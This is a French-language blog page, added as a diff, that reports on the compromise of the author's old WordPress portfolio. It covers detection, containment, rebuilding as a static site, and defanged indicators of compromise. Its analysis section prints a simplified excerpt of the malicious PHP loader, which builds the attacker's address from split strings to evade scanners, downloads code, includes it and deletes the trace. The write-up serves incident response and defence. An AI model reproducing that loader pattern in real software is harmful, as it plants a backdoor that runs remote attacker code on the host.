@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Retour d’expérience : compromission de mon ancien site · Rudy Colombel</title>
+  <meta name="description" content="Retour d’expérience sur la compromission de mon ancien portfolio WordPress : détection par OVHcloud, analyse d’un chargeur PHP, remise à plat et durcissement.">
+  <meta name="color-scheme" content="light dark">
+  <link rel="preload" href="assets/fonts/archivo.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="stylesheet" href="assets/style.css">
+  <script src="assets/theme.js"></script>
+</head>
+<body>
+  <a class="skip" href="#contenu">Aller au contenu</a>
+
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="index.html">Rudy Colombel</a>
+      <nav class="nav" aria-label="Navigation">
+        <ul class="nav-list nav-list-static">
+          <li><a href="index.html#projets">Retour aux projets</a></li>
+        </ul>
+      </nav>
+      <button class="theme-toggle" type="button" aria-label="Passer en thème sombre">
+        <svg class="icon-moon" viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path fill="currentColor" d="M20.7 14.3A8.5 8.5 0 0 1 9.7 3.3a8.5 8.5 0 1 0 11 11Z"/></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><circle cx="12" cy="12" r="4.5" fill="currentColor"/><g stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 1.5v2.5M12 20v2.5M1.5 12H4M20 12h2.5M4.6 4.6l1.8 1.8M17.6 17.6l1.8 1.8M4.6 19.4l1.8-1.8M17.6 6.4l1.8-1.8"/></g></svg>
+      </button>
+    </div>
+  </header>
+
+  <main id="contenu" class="article wrap">
+    <header class="article-head">
+      <p class="article-meta">Retour d’expérience, novembre 2026</p>
+      <h1 class="article-title">Compromission de mon ancien site&nbsp;: de l’alerte à la remise à plat</h1>
+      <p class="article-lead">Mon portfolio WordPress, construit pendant le BTS puis laissé sans mises à jour, a servi pendant des mois à envoyer du spam. Voici comment je l’ai détecté, ce que j’ai trouvé, et comment j’ai reconstruit un site qui ne peut plus être utilisé de cette façon.</p>
+    </header>
+
+    <section class="article-section" aria-labelledby="h-resume">
+      <h2 id="h-resume">En résumé</h2>
+      <dl class="facts">
+        <div><dt>Détection</dt><dd>Alertes de l’hébergeur&nbsp;: envoi massif d’e-mails par PHP, puis volume anormal de requêtes sortantes.</dd></div>
+        <div><dt>Cause</dt><dd>Un chargeur PHP déposé dans le site, très probablement via une extension WordPress jamais mise à jour.</dd></div>
+        <div><dt>Durée d’exposition</dt><dd>Au moins trois mois&nbsp;: le fichier malveillant datait de mi-août.</dd></div>
+        <div><dt>Impact</dt><dd>Hébergement utilisé pour du spam. Aucun signe de compromission du compte OVHcloud ni des accès FTP.</dd></div>
+        <div><dt>Résolution</dt><dd>Suppression complète, site statique reconstruit, PHP bloqué, déploiement par Git avec relecture obligatoire.</dd></div>
+      </dl>
+    </section>
+
+    <section class="article-section" aria-labelledby="h-chrono">
+      <h2 id="h-chrono">Chronologie</h2>
+      <ol class="timeline">
+        <li class="job">
+          <p class="job-when">Mars 2024</p>
+          <div class="job-body"><p>Installation de WordPress en un clic pour le BTS. Après l’examen, plus aucune mise à jour du cœur ni des extensions.</p></div>
+        </li>
+        <li class="job">
+          <p class="job-when">Août 2026 au plus tard</p>
+          <div class="job-body"><p>Dépôt d’un fichier PHP inconnu à la racine du site. Sa date de modification est le seul repère sur le début de la compromission.</p></div>
+        </li>
+        <li class="job">
+          <p class="job-when">Novembre 2026</p>
+          <div class="job-body"><p>OVHcloud détecte un volume anormal d’e-mails envoyés via PHP et bloque l’envoi, puis bloque aussi les requêtes sortantes de l’hébergement.</p></div>
+        </li>
+        <li class="job">
+          <p class="job-when">19 et 20 novembre</p>
+          <div class="job-body"><p>Vérification du compte, changement des accès, suppression de WordPress et de sa base, inventaire des fichiers restants, découverte et analyse du chargeur, mise en ligne d’un site statique.</p></div>
+        </li>
+        <li class="job">
+          <p class="job-when">25 novembre</p>
+          <div class="job-body"><p>Levée des dernières mesures de sécurité et mise en place du déploiement depuis GitHub.</p></div>
+        </li>
+      </ol>
+    </section>
+
+    <section class="article-section" aria-labelledby="h-contenir">
+      <h2 id="h-contenir">1. Contenir&nbsp;: couper les accès avant de nettoyer</h2>
+      <p>Supprimer les fichiers infectés ne sert à rien si l’attaquant peut revenir par un autre accès. J’ai donc commencé par le compte de l’hébergeur, puis l’hébergement lui-même&nbsp;:</p>
+      <ul class="checklist">
+        <li>double authentification active sur le compte OVHcloud, codes de secours générés&nbsp;;</li>
+        <li>journal des connexions, utilisateurs secondaires, clés API et clés SSH du compte&nbsp;: rien d’inconnu&nbsp;;</li>
+        <li>mot de passe FTP changé, un seul utilisateur, aucune tâche planifiée (cron)&nbsp;;</li>
+        <li>sur GitHub, révocation des applications tierces que je n’utilisais plus.</li>
+      </ul>
+    </section>
+
+    <section class="article-section" aria-labelledby="h-eradiquer">
+      <h2 id="h-eradiquer">2. Éradiquer&nbsp;: repartir de zéro plutôt que désinfecter</h2>
+      <p>Le site n’avait plus de valeur et le point d’entrée n’était pas identifié avec certitude. Nettoyer un WordPress compromis aurait laissé un doute permanent&nbsp;: j’ai tout supprimé, module, fichiers et base de données.</p>
+      <p>La leçon de cette étape est venue de l’inventaire qui a suivi. <strong>La suppression automatique du module n’avait pas vidé le dossier du site</strong>&nbsp;: elle retire ce que l’hébergeur a installé, pas ce qu’un attaquant a ajouté. Il restait un fichier, <code>links-xml.php</code>, que rien ne rattachait à WordPress.</p>
+    </section>
+
+    <section class="article-section" aria-labelledby="h-analyse">
+      <h2 id="h-analyse">3. Analyser le fichier restant</h2>
+      <p>Lu dans un éditeur de texte, sans jamais l’exécuter, le fichier se révèle être un <strong>chargeur de code à distance</strong>. Il ne contient rien de visiblement malveillant&nbsp;: le vrai programme reste chez l’attaquant.</p>
+      <pre class="code" aria-label="Extrait simplifié du chargeur"><code>$_u = 'ht' . 'tp' . ':/' . '/';          // adresse découpée en morceaux
+$_h = 'lx' . 'ml' . '.ah' . 'kj' . '.lo' . 'l'; // pour échapper aux antivirus
+// … télécharge un fichier texte depuis ce serveur …
+@file_put_contents($_tf, $_code);  // l’écrit dans un fichier temporaire
+@include($_tf);                    // l’exécute
+@unlink($_tf);                     // puis efface la trace</code></pre>
+      <ol class="steps">
+        <li><strong>L’adresse est découpée</strong> en petits morceaux pour ne pas être repérée par une recherche de chaînes suspectes.</li>
+        <li>À chaque appel, <strong>il télécharge du code PHP</strong> depuis le serveur de l’attaquant.</li>
+        <li><strong>Il l’exécute</strong> depuis un fichier temporaire, puis le supprime.</li>
+        <li>Ses messages d’erreur, en anglais et en chinois, sont typiques des kits de spam vendus clés en main.</li>
+      </ol>
+      <p>Ce fonctionnement explique les deux alertes&nbsp;: les requêtes sortantes servaient à récupérer le code, et ce code envoyait le spam. L’attaquant pouvait changer de charge utile à tout moment, sans retoucher au fichier.</p>
+      <p>Les autres éléments vérifiés étaient sains&nbsp;: le <code>.htaccess</code> était celui de WordPress, sans redirection ajoutée, et les fichiers de configuration du compte étaient ceux d’origine.</p>
+    </section>
+
+    <section class="article-section" aria-labelledby="h-durcir">
+      <h2 id="h-durcir">4. Reconstruire en réduisant la surface d’attaque</h2>
+      <p>Plutôt que de réinstaller un CMS, j’ai choisi un site <strong>entièrement statique</strong>. Chaque mesure répond à une étape de l’attaque&nbsp;:</p>
+      <div class="table-wrap">
+        <table class="measures">
+          <thead><tr><th scope="col">Ce que l’attaque utilisait</th><th scope="col">Ce qui l’empêche aujourd’hui</th></tr></thead>
+          <tbody>
+            <tr><td>Une extension WordPress vulnérable</td><td>Plus de CMS, plus d’extension, plus de base de données</td></tr>
+            <tr><td>Un fichier PHP déposé dans le site</td><td>Toute exécution de PHP est refusée par le serveur (erreur 403)</td></tr>
+            <tr><td>L’envoi d’e-mails par PHP</td><td>Envoi de mails par script désactivé sur l’hébergement</td></tr>
+            <tr><td>Des fichiers ajoutés en douce</td><td>Le site est redéployé depuis Git&nbsp;: le dépôt est la seule source de vérité</td></tr>
+            <tr><td>Un site jamais surveillé</td><td>En-têtes de sécurité stricts, notés A+ sur securityheaders.com</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Le déploiement suit lui aussi le principe du moindre privilège&nbsp;: la branche principale est verrouillée, chaque modification passe par une pull request que je relis, l’hébergeur ne fait que <em>lire</em> un dépôt public, et aucun mot de passe ni aucune clé n’est stocké pour déployer.</p>
+    </section>
+
+    <section class="article-section" aria-labelledby="h-lecons">
+      <h2 id="h-lecons">Ce que j’en retiens</h2>
+      <ul class="checklist">
+        <li><strong>Un site oublié reste exposé.</strong> Ce qui est en ligne doit avoir un responsable et un rythme de mises à jour, ou être supprimé.</li>
+        <li><strong>Couper les accès avant de nettoyer</strong>, sinon le nettoyage ne tient pas.</li>
+        <li><strong>Vérifier ce que l’outil de suppression laisse derrière lui.</strong> C’est l’inventaire manuel qui a permis de trouver le chargeur.</li>
+        <li><strong>Moins de composants, moins de failles.</strong> Un portfolio n’a besoin ni de PHP, ni de base de données, ni d’envoi de mails.</li>
+      </ul>
+      <p class="note"><strong>Limite de cette analyse&nbsp;:</strong> je n’ai pas exploité les journaux d’accès antérieurs à la suppression. La porte d’entrée par une extension non mise à jour est l’hypothèse la plus probable, pas un fait démontré.</p>
+    </section>
+
+    <section class="article-section" aria-labelledby="h-ioc">
+      <h2 id="h-ioc">Indicateurs de compromission</h2>
+      <p>Pour ceux qui retrouveraient la même chose sur leur hébergement. Les adresses sont volontairement neutralisées.</p>
+      <ul class="ioc">
+        <li><span>Fichier</span><span><code>links-xml.php</code>, environ 1,4&nbsp;Ko, à la racine du site</span></li>
+        <li><span>Domaine contacté</span><span><code>lxml[.]ahkj[.]lol</code></span></li>
+        <li><span>Ressource téléchargée</span><span><code>/links-xml-plus.txt</code></span></li>
+        <li><span>Fichiers temporaires</span><span>fichiers cachés nommés <code>.t</code> suivi de 8 caractères</span></li>
+      </ul>
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap footer-inner">
+      <p>© 2026 Rudy Colombel · <a href="https://github.com/rubiocolombel/portfolio">Code source</a></p>
+      <p><a href="index.html">Retour au portfolio</a></p>
+    </div>
+  </footer>
+
+  <script src="assets/main.js" defer></script>
+</body>
+</html>
